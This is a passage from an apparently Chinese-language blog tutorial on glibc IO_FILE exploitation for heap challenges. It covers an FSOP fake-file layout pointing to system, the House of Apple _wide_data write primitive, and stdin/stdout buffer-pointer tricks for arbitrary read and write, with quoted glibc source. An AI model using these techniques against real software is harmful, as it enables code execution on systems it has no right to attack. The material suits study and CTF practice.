class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = bin_sh_addr,</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = _IO_str_jumps<span class=\"number\">-8</span> <span class=\"comment\">//chunk_addr + 0xd8 ~ +0xe0 (2.24之前可以)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+<span class=\"number\">0xe0</span> ~ +<span class=\"number\">0xe8</span> : <span class=\"number\">0x0</span></span><br><span class=\"line\">+<span class=\"number\">0xe8</span> ~ +<span class=\"number\">0xf0</span> : system_addr / one_gadget <span class=\"comment\">//fp-&gt;_s._free_buffer</span></span><br></pre></td></tr></table></figure>\n\n<p>而在<code>libc-2.28</code>及以后，由于不再使用偏移找<code>_s._allocate_buffer</code>和<code>_s._free_buffer</code>，而是直接用<code>malloc</code>和<code>free</code>代替，所以<code>FSOP</code>也失效了。</p>\n<h3 id=\"IO-wide-data（House-of-Apple）\"><a href=\"#IO-wide-data（House-of-Apple）\" class=\"headerlink\" title=\"_IO_wide_data（House of Apple）\"></a>_IO_wide_data（House of Apple）</h3><p><code>struct _IO_wide_data *_wide_data</code>在<code>_IO_FILE</code>中的偏移为<code>0xa0</code></p>\n<p><code>_IO_wide_data</code>的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_ptr;    <span class=\"comment\">/* Current read pointer */</span> \t\t\t<span class=\"comment\">//0x00</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_end;    <span class=\"comment\">/* End of get area. */</span>\t\t\t\t<span class=\"comment\">//0x08</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_read_base;    <span class=\"comment\">/* Start of putback+get area. */</span>\t <span class=\"comment\">//0x10</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_base;    <span class=\"comment\">/* Start of put area. */</span>\t\t\t<span class=\"comment\">//0x18</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_ptr;    <span class=\"comment\">/* Current put pointer. */</span>\t\t\t<span class=\"comment\">//0x20</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_write_end;    <span class=\"comment\">/* End of put area. */</span>\t\t\t\t<span class=\"comment\">//0x28</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_buf_base;    <span class=\"comment\">/* Start of reserve area. */</span>\t\t<span class=\"comment\">//0x30</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_buf_end;        <span class=\"comment\">/* End of reserve area. */</span>\t\t<span class=\"comment\">//0x38</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_save_base;    <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_backup_base;    <span class=\"comment\">/* Pointer to first valid character of</span></span><br><span class=\"line\"><span class=\"comment\">                   backup area */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *_IO_save_end;    <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"type\">__mbstate_t</span> _IO_state;</span><br><span class=\"line\">  <span class=\"type\">__mbstate_t</span> _IO_last_state;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> _<span class=\"title\">codecvt</span>;</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *_<span class=\"title\">wide_vtable</span>;</span> <span class=\"comment\">//_IO_wide_data+0xe0</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>伪造<code>_wide_data</code>变量，通过<code>_IO_wstrn_overflow</code>可以将已知地址空间上的某些值修改为一个已知值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">wint_t</span> _IO_wstrn_overflow (FILE *fp, <span class=\"type\">wint_t</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* When we come to here this means the user supplied buffer is</span></span><br><span class=\"line\"><span class=\"comment\">     filled.  But since we must return the number of characters which</span></span><br><span class=\"line\"><span class=\"comment\">     would have been written in total we must provide a buffer for</span></span><br><span class=\"line\"><span class=\"comment\">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class=\"line\"><span class=\"comment\">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class=\"line\">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class=\"line\">         snf-&gt;overflow_buf + (<span class=\"keyword\">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class=\"line\">                      / <span class=\"keyword\">sizeof</span> (<span class=\"type\">wchar_t</span>)), <span class=\"number\">0</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class=\"line\">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class=\"line\">                      + (<span class=\"keyword\">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class=\"line\">                     / <span class=\"keyword\">sizeof</span> (<span class=\"type\">wchar_t</span>))); <span class=\"comment\">//overflow_buf+偏移</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class=\"line\">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Since we are not really interested in storing the characters</span></span><br><span class=\"line\"><span class=\"comment\">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>_IO_wstrn_overflow</code>首先将<code>fp</code>强制转化为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p>\n<p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p>\n<p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> _IO_wsetb (FILE *f, <span class=\"type\">wchar_t</span> *b, <span class=\"type\">wchar_t</span> *eb, <span class=\"type\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class=\"line\">    <span class=\"built_in\">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class=\"comment\">// 其不为0的时候不要执行到这里</span></span><br><span class=\"line\">  f-&gt;_wide_data-&gt;_IO_buf_base = b; <span class=\"comment\">//overflow_buf</span></span><br><span class=\"line\">  f-&gt;_wide_data-&gt;_IO_buf_end = eb; <span class=\"comment\">//overflow_buf+偏移</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (a)</span><br><span class=\"line\">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样也能写入到<code>f-&gt;_wide_data-&gt;_IO_buf_base</code>和<code>f-&gt;_wide_data-&gt;_IO_buf_end</code></p>\n<p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class=\"line\">  _IO_free_type _free_buffer_unused;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  FILE _f;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_strfile_</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span> _<span class=\"title\">sbf</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span> _<span class=\"title\">s</span>;</span></span><br><span class=\"line\">&#125; _IO_strfile;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_strfile f;</span><br><span class=\"line\">  <span class=\"comment\">/* This is used for the characters which do not fit in the buffer</span></span><br><span class=\"line\"><span class=\"comment\">     provided by the user.  */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> overflow_buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">&#125; _IO_strnfile;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_strfile f;</span><br><span class=\"line\">  <span class=\"comment\">/* This is used for the characters which do not fit in the buffer</span></span><br><span class=\"line\"><span class=\"comment\">     provided by the user.  */</span></span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> overflow_buf[<span class=\"number\">64</span>]; <span class=\"comment\">// overflow_buf相对于_IO_FILE结构体的偏移为0xf0，在vtable后面。</span></span><br><span class=\"line\">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure>\n\n<p>因此如果能在堆上伪造一个<code>_IO_FILE</code>结构体，将其<code>vtable</code>替换为<code>_IO_wstrn_jumps</code>，伪造<code>_wide_data</code>并覆盖，并伪造其他字段绕过检测调用<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>fake _wide_data</code>至<code>fake _wide_data+0x38</code>的地址区域的内容都替换为<code>fake_IO_FILE的overflow_buf+0xf0</code>或者<code>fake_IO_FILE的overflow_buf + 0x1f0</code>。</p>\n<p>对<code>_wide_data</code>的利用是House of Apple的原理。</p>\n<h3 id=\"IO-FILE中file的读写指针利用\"><a href=\"#IO-FILE中file的读写指针利用\" class=\"headerlink\" title=\"IO_FILE中file的读写指针利用\"></a>IO_FILE中file的读写指针利用</h3><p>由于伪造的vtable常常都不在合法范围之内，因此很难再利用vtable，不过我们还可以利用file。</p>\n<p>IO_FILE结构中包含了关于文件的基本信息，其中就有与文件读写相关的字段，fwrite、fread等操作就需要利用这些信息。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\"><span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure>\n\n<p>如果我们能控制以上字段，那就可以控制缓冲区的读写范围，实现任意读写。即使没有打开文件也没有关系，程序本身会创建stdin、stdout、stderr，控制这两个字段后通过sprintf、printf等函数一样可以利用。</p>\n<h4 id=\"利用stdin进行任意写\"><a href=\"#利用stdin进行任意写\" class=\"headerlink\" title=\"利用stdin进行任意写\"></a>利用stdin进行任意写</h4><p><code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走），最后都会调用vtable中的<code>_xsgetn()</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> ...</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      <span class=\"comment\">//输入缓冲区为空则初始化输入缓冲区</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (want &gt; <span class=\"number\">0</span>) <span class=\"comment\">//还需要get的字节数</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (have &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ...</span><br><span class=\"line\">          <span class=\"comment\">//memcpy</span></span><br><span class=\"line\"> </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base</span><br><span class=\"line\">          &amp;&amp; want &lt; (<span class=\"type\">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__underflow (fp) == EOF)  <span class=\"comment\">// 调用__underflow读入数据</span></span><br><span class=\"line\">          ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - want;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_ssize_t count;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。</span></span><br><span class=\"line\">  <span class=\"comment\">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 如果输入缓冲区里存在数据，则直接返回</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"comment\">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span></span><br><span class=\"line\">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class=\"line\">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>\n\n<p>如果<code>_IO_buf_base</code>为空，则会初始化缓冲区。</p>\n<p>之后会判断<code>_IO_read_ptr</code>对应的空间是否有剩余，如果有则**直接复制到目的地址(传入的data)**。</p>\n<p>如果<code>_IO_read_ptr</code>中的内容没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到从<code>_IO_buf_base</code>开始到<code>_IO_buf_end</code>的位置，默认<code>0x400</code>字节。</p>\n<p>此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将<code>_IO_read_ptr</code>中的数据复制到目的地址(传入的data)。</p>\n<p>综上，为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：</p>\n<ol>\n<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得<code>_IO_read_ptr</code>没有剩余数据，从而可以通过<code>SYS_read</code>读入数据）。</li>\n<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。</li>\n<li> 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。</li>\n<li> 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_ buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</li>\n</ol>\n<h4 id=\"利用stdout进行任意读-写\"><a href=\"#利用stdout进行任意读-写\" class=\"headerlink\" title=\"利用stdout进行任意读/写\"></a>利用stdout进行任意读/写</h4><p><code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走），最后会调用vtable中的<code>_xsputn()</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class=\"type\">const</span> <span class=\"type\">void</span> *data, _IO_size_t n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) data;</span><br><span class=\"line\">  _IO_size_t to_do = n;</span><br><span class=\"line\">  <span class=\"type\">int</span> must_flush = <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_size_t count = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123; <span class=\"comment\">//如果是行缓冲模式...</span></span><br><span class=\"line\">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class=\"comment\">//判断输出缓冲区还有多少空间</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt;= n)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"type\">const</span> <span class=\"type\">char</span> *p;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (p = s + n; p &gt; s; )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (*--p == <span class=\"string\">&#x27;\\n&#x27;</span>) <span class=\"comment\">//最后一个换行符\\n为截断符，且需要刷新输出缓冲区</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  count = p - s + <span class=\"number\">1</span>;</span><br><span class=\"line\">                  must_flush = <span class=\"number\">1</span>; <span class=\"comment\">//标志为真：需要刷新输出缓冲区</span></span><br><span class=\"line\">                  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class=\"comment\">//判断输出缓冲区还有多少空间（全缓冲模式）</span></span><br><span class=\"line\">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>) <span class=\"comment\">//输出缓冲区余下空间&gt;0</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; to_do)</span><br><span class=\"line\">      \tcount = to_do;</span><br><span class=\"line\">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); <span 